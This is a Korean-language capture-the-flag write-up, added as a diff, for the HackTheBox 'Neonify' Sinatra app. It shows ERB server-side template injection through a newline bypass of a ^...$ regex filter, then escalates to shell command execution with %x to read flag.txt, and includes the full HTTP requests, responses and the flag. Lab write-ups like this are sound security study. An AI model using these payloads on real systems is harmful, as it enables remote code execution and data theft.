@@ -1,0 +1,132 @@
+ROOM: Neonify
+TARGET: 94.237.57.211:56108
+
+
+
+http://94.237.57.211:56108/
+웹페이지엔 입력칸 만 존재 값을 넣으면 다시 출력해줌 
+특수문자를 포함하면 Malicious Input Detected 라고 나온다
+
+웹페이지 코드 분석
+class NeonControllers < Sinatra::Base
+
+  configure do
+    set :views, "app/views"
+    set :public_dir, "public"
+  end
+
+  get '/' do
+    @neon = "Glow With The Flow"
+    erb :'index'
+  end
+
+  post '/' do			// 입력이 주어졌을때 웹에 보내는 요청
+    if params[:neon] =~ /^[0-9a-z ]+$/i				//영문자 + 숫자만 허락 나머지는 필터링
+      @neon = ERB.new(params[:neon]).result(binding)	//사용자의 입력을 neon 변수에 저장
+    else
+      @neon = "Malicious Input Detected"
+    end
+    erb :'index'
+  end
+
+end
+
+사용자의 입력을 받은뒤 필터링해서 출력하는 코드
+ 
+rb코드를 찾아 보니 아래 코드는 rce가 가능
+ERB.new(params[:neon]).result(binding) 
+payload 예시
+<%= 7 * 7 %>
+
+하지만 필터링에 의해서 특수문자는 포함하지 못한다
+regex bypass를 위해 찾아보니
+params[:input] =~ /^[a-z0-9 ]+$/i
+위 코드는 한줄만 필터링하고 개행문자 이후는 필터링하지 않는다는것을 알게됐다
+
+예상 payload
+
+temp\n<%= 7*7%>
+
+
+HTTP REQUEST
+
+POST / HTTP/1.1
+Host: 94.237.57.211:56108
+Content-Length: 19
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://94.237.57.211:56108
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://94.237.57.211:56108/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+neon=temp
+<%25%3d+7*7%25>
+
+
+HTTP RESPONSE
+
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Content-Length: 542
+X-Xss-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Server: WEBrick/1.6.1 (Ruby/2.7.5/2021-11-24)
+Date: Wed, 09 Jul 2025 14:07:30 GMT
+Connection: Keep-Alive
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Neonify</title>
+    <link rel="stylesheet" href="stylesheets/style.css">
+    <link rel="icon" type="image/gif" href="/images/gem.gif">
+</head>
+<body>
+    <div class="wrapper">
+        <h1 class="title">Amazing Neonify Generator</h1>
+        <form action="/" method="post">
+            <p>Enter Text to Neonify</p><br>
+            <input type="text" name="neon" value="">
+            <input type="submit" value="Submit">
+        </form>
+        <h1 class="glow">temp
+49</h1>
+    </div>
+</body>
+</html>
+
+
+제대로 값이 출려되는걸 볼 수 있다
+
+flag.txt출력을 위한 payload
+
+neon=temp
+<%='cat flag.txt'%>
+했으나 실패
+그냥 cat flag 평문이 출력됨
+
+다른 자료를 찾아보니 ruby shell command 입력문법을 찾아보니 %x를 추가로 넣어줘야됨
+neon=temp
+<%=%x'cat flag.txt'%>수정
+
+        <h1 class="glow">temp
+HTB{r3pl4c3m3n7_s3cur1ty}
+	</h1>
+성공적으로 플래그가 출력되었다
+
+
+
+
+
+
+참고
+
+https://exploit-notes.hdks.org/exploit/web/framework/ruby/ruby-on-rails-pentesting/
+https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/
+https://www.writesoftwarewell.com/call-shell-commands-in-ruby/
